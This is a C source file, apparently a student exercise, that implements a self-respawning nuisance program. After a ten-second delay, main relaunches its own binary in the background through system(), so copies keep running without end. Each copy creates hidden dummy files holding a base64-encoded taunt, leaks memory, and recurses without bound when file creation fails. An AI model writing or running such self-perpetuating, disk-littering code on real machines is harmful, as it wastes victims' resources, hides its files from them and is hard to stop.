/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   eurystheus.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mikim <mikim@student.42.us.org>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/04/14 20:03:06 by mikim             #+#    #+#             */
/*   Updated: 2018/04/14 21:15:46 by mikim            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* ************************************************************************** */
/*                                                              Mingyun Kim   */
/*                                           https://www.github.com/mikim42   */
/* ************************************************************************** */

#include <libft.h>

void	corruption(void)
{
	char	*memory_eater;
	char	*tmp;
	int		fd;

	tmp = ft_strjoin(".YouFeelAnEveilPresenceWatchingYou___.dummy",
						ft_itoa(rand() % 101010));
	if ((fd = open(tmp, O_CREAT)) < 0)
	{
		ft_strdel(&tmp);
		return (corruption());
	}
	ft_strdel(&tmp);
	write(fd, "QSBob3JyaWJsZSBjaGlsbCBnb2VzIGRvd24geW91ciBzcGluZS4uLgo=", 57);
	memory_eater = ft_strdup("Your memory is getting corrupted...");
}

int		main(int ac, char **av)
{
	char	*tmp;

	(void)ac;
	srand(time(NULL));
	sleep(10);
	tmp = ft_strjoin(av[0], " &");
	system(tmp);
	ft_strdel(&tmp);
	corruption();
	return (0);
}
